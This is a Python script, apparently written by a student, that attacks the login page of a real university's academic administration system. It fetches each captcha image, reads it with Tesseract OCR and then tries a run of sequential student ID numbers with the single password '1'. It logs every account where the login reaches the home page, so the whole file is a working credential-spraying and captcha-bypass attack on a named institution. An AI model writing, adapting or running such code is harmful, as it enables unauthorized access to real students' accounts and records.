import requests
import pytesseract
from PIL import Image
import time

if __name__ == '__main__':
    data = {
        'loginForm.name': '021116114',
        'loginForm.password': '1',
        'loginForm.captcha': ''
    }
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Cookie': '',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Length': '86',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'jxxt.sues.edu.cn',
        'Origin': 'http://jxxt.sues.edu.cn',
        'Referer': 'http://jxxt.sues.edu.cn/eams/index.action?method=index',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'
    }
    users=[]

    for i in range(21116301, 21116351):
        codeurl = 'http://jxxt.sues.edu.cn/eams/captcha/image.action'
        valcode = requests.get(codeurl)
        with open('image.gif', 'wb') as file:
            file.write(valcode.content)
        img = Image.open('image.gif')
        checkcode = pytesseract.image_to_string(img)
        data['loginForm.captcha'] = checkcode

        hosturl = 'http://jxxt.sues.edu.cn/eams/login.action'

        cookieText = requests.utils.dict_from_cookiejar(valcode.cookies)
        headers['Cookie'] = 'test=' + cookieText['test'] + ';JSESSIONID=' + cookieText['JSESSIONID']
        # response = requests.get(hosturl, params=data, headers=headers)

        # post方法没成功get方法成功了？？

        data['loginForm.name'] = '0' + str(i)
        print("User: " + str(i))
        response = requests.post(hosturl, headers=headers, cookies=requests.utils.dict_from_cookiejar(valcode.cookies),
                                 data=data)
        print(response.status_code)
        if response.url == 'http://jxxt.sues.edu.cn/eams/home.action?method=index&actionName=home%3Fmethod%3Dindex':
            print('Get user: ' + str(i))
            users.append(i)
            # break
        # time.sleep(1)

    # response = requests.post(hosturl, headers=headers, cookies=requests.utils.dict_from_cookiejar(valcode.cookies),
    #                          data=data)
    # 结果post方法也成功了！！

    print(requests.utils.dict_from_cookiejar(valcode.cookies))
    print(requests.utils.dict_from_cookiejar(response.cookies))
    print(response.headers)
    print(response.url)
    # print(response.text)
    with open('t.html', 'w', encoding='utf-8') as file:
        file.write(response.text)

    print(users)
